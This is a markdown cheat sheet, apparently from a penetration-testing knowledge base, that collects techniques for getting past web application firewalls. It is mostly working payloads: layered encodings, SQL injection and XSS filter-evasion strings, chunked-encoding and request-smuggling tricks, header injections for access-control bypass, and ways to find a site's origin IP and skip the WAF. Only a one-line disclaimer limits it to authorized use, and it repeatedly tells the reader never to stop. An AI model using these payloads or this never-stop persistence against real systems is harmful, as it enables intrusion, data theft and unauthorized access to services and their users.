# WAF Bypass Arsenal - exhaustive techniques & payloads

**Every WAF is bypassable - humans wrote it, humans make mistakes.** Read this when a filter/WAF blocks you. Work through every section; do not stop. (The methodology is in `attack-engine.md` -> "Defenses are signals, not walls"; this is the payload depth behind it.) Per-class bypass detail also lives in each topic's `*/WAF-filter-bypass/` and `*/Filter-bypass*/` folder.

> Authorized lab / CTF / scoped-engagement only.

---

## 1. Identify the WAF first

```
wafw00f https://TARGET            # automated
# manual header tells:
Cloudflare    cf-ray, server: cloudflare        Akamai     x-akamai-*, akamai-grn
AWS WAF       x-amzn-requestid, x-amz-cf-id       Imperva    x-iinfo, visid_incap_*
F5 BIG-IP     x-wa-info, BigIP cookie             Sucuri     x-sucuri-id, x-sucuri-cache
ModSecurity   server header, error-page format    Barracuda  barra_counter_session
Fortinet      FORTIWAFSID cookie
```
Then **WebSearch "<WAF name> bypass <year>"** - always research the specific WAF, not generic lists.

---

## 2. Encoding ladder (try all, cheapest first)

```
URL          ' ->%27   < ->%3C   > ->%3E   " ->%22   ( ->%28   ) ->%29
double-URL   ' ->%2527   < ->%253C            triple-URL  ' ->%252527
unicode      ' ->%u0027 / '    < -><
fullwidth    < ->＜(U+FF1C)  > ->＞  ' ->＇  " ->＂  ( ->（  / ->／   (visual confusables)
NFKC norm    ﬀ->ff  ﬁ->fi  ℌ->H  ℛ->R   -> ＜ℌcript＞ becomes <script> if WAF=NFC but backend=NFKC
HTML entity  ' ->&#39;/&#x27;/&#039;   < ->&#60;/&#x3C;   (leading zeros: &#0060;&#000060;)
hex / octal  ' ->0x27   ' ->\47        base64 in param: payload=PHNjcmlwdD4...
JSON unicode <script> ...   ${7*7} -> ${7*7}
mixed        %253Cscript%253E - %u003Cscript> - &#x3C;script&#x3E;
```

---

## 3. SQL injection bypass payloads

```
whitespace   SELECT/**/x/**/FROM   %09(tab) %0A(nl) %0C(ff) %0D(cr)   SELECT(x)FROM(y)   SELECT+x+FROM+y
comments     SEL/**/ECT   UN/**/ION   SE%00LECT   /*!50000SELECT*/   /*!UNION*/+/*!SELECT*/
case         SeLeCt - uNiOn SeLeCt
concat       MySQL CONCAT('SEL','ECT') or 'SEL' 'ECT' - MSSQL 'SEL'+'ECT' - Oracle/PG 'SEL'||'ECT'
alt-OR       OR 2>1 - OR 'a'='a' - OR 1 LIKE 1 - OR 1 BETWEEN 0 AND 2 - ||1=1 - OR 0x1=0x1
alt-UNION    UNION ALL SELECT - UNION DISTINCT SELECT - UNION/**/SELECT
alt-sleep    BENCHMARK(10000000,SHA1('a')) - (SELECT*FROM(SELECT(SLEEP(5)))a) - WAITFOR DELAY '0:0:5'(MSSQL)
no-quotes    CHAR(39) - 0x27 - CHR(39)(Oracle)     info_schema  information_schema/**/./**/tables - `information_schema`.`tables`
sqlmap       --tamper=space2comment,randomcase,between,charunicodeencode  (chain 3-4; --random-agent --delay=2)
```
-> deep: `SQL-injection/WAF-filter-bypass/`

---

## 4. XSS bypass payloads

```
events      <img/src=x onerror=alert(1)> - <svg/onload=alert(1)> - <body onload> - <input onfocus=alert(1) autofocus>
            <marquee onstart> - <details open ontoggle> - <video src=x onerror> - <math><mtext><table><mglyph><svg onload>
obfuscate   <ScRiPt> - <scr<script>ipt> - alert`1` - window['alert'](1) - self['ale'+'rt'](1) - eval('ale'+'rt(1)')
            Function('ale'+'rt(1)')() - setTimeout('alert(1)',0) - []['constructor']['constructor']('alert(1)')()
SVG (CF)    <svg><animate onbegin=alert(1) attributeName=x dur=1s> - <svg><set onbegin=alert(1) attributeName=x to=1>
            <svg><a><animate attributeName=href values=javascript:alert(1)>
HTML5       <button popovertarget=x>x<div popover id=x onbeforetoggle=alert(1)> - <div contenteditable onInput=alert(1)>
protocols   javascript:alert(1) - jaVasCriPt:alert`1` - javascript://%0aalert(1) - data:text/html,<script>alert(1)</script>
encoded     onerror=&#97;&#108;&#101;&#114;&#116;(1) - onerror=alert(1) - onerror=eval(atob('YWxlcnQoMSk='))
```
-> deep: `XSS/WAF-filter-bypass/`, `XSS/CSP-bypass/`

---

## 5. Protocol-level bypass

```
method swap         GET blocked? try POST/PUT/PATCH/OPTIONS/TRACE with the payload in the body
content-type        switch x-www-form-urlencoded ↔ application/json ↔ multipart/form-data ↔ text/plain ↔ xml (WAF may inspect only one)
multipart boundary  mutate boundary (extra params, charset) - WAF may fail to parse, backend still does
chunked TE          Transfer-Encoding: chunked + split keyword across chunks (UNIO\nN SEL\nECT) - WAF sees chunks, backend reassembles
HPP                 ?id=1&id=<payload> - WAF checks first occurrence, backend uses last (or vice-versa; try both orders)
HTTP/2              does the WAF inspect H2 the same as H1? H2.TE / H2.CL survive downgrade -> request smuggling
```

---

## 6. Header injection (WAF often doesn't inspect headers)

```
X-Forwarded-For / X-Originating-IP / X-Remote-IP / X-Client-IP / True-Client-IP : <payload or 127.0.0.1>
Referer / User-Agent / Accept-Language : <payload>           (reflected-input sinks WAFs skip)
X-Original-URL / X-Rewrite-URL : /admin/endpoint              (path override -> access-control bypass)
X-Custom-IP-Authorization: 127.0.0.1                          (IP-whitelist bypass)
X-Forwarded-Host: <payload>                                   (host-header attacks)
```

---

## 7. Bypass the WAF entirely - find the origin IP

```
DNS history     SecurityTrails - ViewDNS - completedns
cert search     crt.sh "%.target.com" - Censys/Shodan by SSL cert hash (same cert = same server)
email headers   trigger a password reset -> read email source -> origin IP often leaks
MX/SPF          dig MX target.com - dig TXT target.com (SPF may list origin)
subdomains      some subdomains point straight at origin, skipping the CDN/WAF:  subfinder -d target | dnsx -a
```
Hit the origin directly (Host header set to the site) -> no WAF in path. *In-scope assets only.*

---

## 8. WAF-invisible attack classes (when you can't bypass - change the class)

A WAF inspects payload **shape**, not **intent**. These classes have no payload signature, so they sail straight through - and are often higher severity than XSS/SQLi:
```
IDOR / broken access control - business logic (price/workflow/step-skip) - race conditions -
auth & session logic - OAuth/OIDC misconfig - GraphQL authz bypass - mass assignment -
JWT claim manipulation (valid-looking token) - API version rollback - WebSocket attacks -
information disclosure (data in normal responses) - CORS exploitation
```
**If the filter wins, don't stop - pivot to a class it can't see** (`objectives-attack-trees.md`).

---

## 9. Tools
```
wafw00f (identify) - sqlmap --tamper (see §3) - xsstrike (XSS) - Burp Intruder/Param-Miner -
nuclei -tags waf - gobypass403 / bypass-url (403/401 bypass)
```
